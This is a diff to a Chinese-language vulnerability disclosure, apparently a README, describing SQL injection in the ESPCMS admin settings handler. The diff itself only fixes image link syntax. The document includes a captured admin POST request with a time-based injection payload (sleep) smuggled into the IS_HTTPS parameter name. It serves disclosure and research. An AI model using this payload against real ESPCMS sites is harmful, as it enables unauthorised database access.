@@ -6,12 +6,12 @@ phpstudy安装
 代码审计
 espcms_admin/control/SettingMain.php
 在更新网站配置时，key和value的值是直接拼接进去的，因此存在SQL注入漏洞
-[1.jpg](https://github.com/Appeal-specific/espcmsSQL-/blob/main/1.jpg)
+![1](https://github.com/Appeal-specific/espcmsSQL-/blob/main/1.jpg)
 
 漏洞复现
 安装成功后进入网站后台
 点击设置->系统设置->确定保存
-[2.jpg](https://github.com/Appeal-specific/espcmsSQL-/blob/main/2.jpg)
+![2](https://github.com/Appeal-specific/espcmsSQL-/blob/main/2.jpg)
 并抓包，数据包如下
 
 POST /espcms_admin/index.php?act=FuNYwqPAgpSXj4m5d2npHEownomPfTf6l4%2BJuXdp6Rxja3m%2FkIeu1g%3D%3D HTTP/1.1
@@ -28,7 +28,7 @@ Connection: close
 token_key=&token_name=&config_name=%E5%9F%BA%E6%9C%AC%E5%8F%82%E6%95%B0%E8%AE%BE%E7%BD%AE&SITENAME=123456&WEB_ICON_16=upfile%2Fespcms_16.png&WEB_ICON_32=upfile%2Fespcms_32.png&WEB_ICON_64=upfile%2Fespcms_64.png&IS_CLOSE=0&CLOSE_CONTENT=&ADMINE_MAIL=123%40qq.com&IS_LOG=1&IS_GZIP=1&DEFAULT_LNG=cn&IS_ALONELNG=1&HOME_LNG=cn&IS_HTML=1&IS_REWRITE=0&ENTRANCE_FILE=index&IS_HTMLDIR=1&FILE_HTMLDIR=html%2F&IS_GETCACHE=1&IS_CACHING=1&CACHE_TIME=3600&HTTP_PATHTYPE=1&TIP_SEARCHTIME=30&IS_HTTPS'and/**/(sleep(3))and'1'%3d'1=http
 
 修改请求体中的IS_HTTPS为IS_HTTPS'and/**/(sleep(2))and'1'%3d'1
-[3.jpg]https://github.com/Appeal-specific/espcmsSQL-/blob/main/3.jpg
-[4.jpg]https://github.com/Appeal-specific/espcmsSQL-/blob/main/4.jpg
+![3](https://github.com/Appeal-specific/espcmsSQL-/blob/main/3.jpg)
+![4](https://github.com/Appeal-specific/espcmsSQL-/blob/main/4.jpg)
 
 Sleep()函数成功执行，因此存在SQL注入漏洞
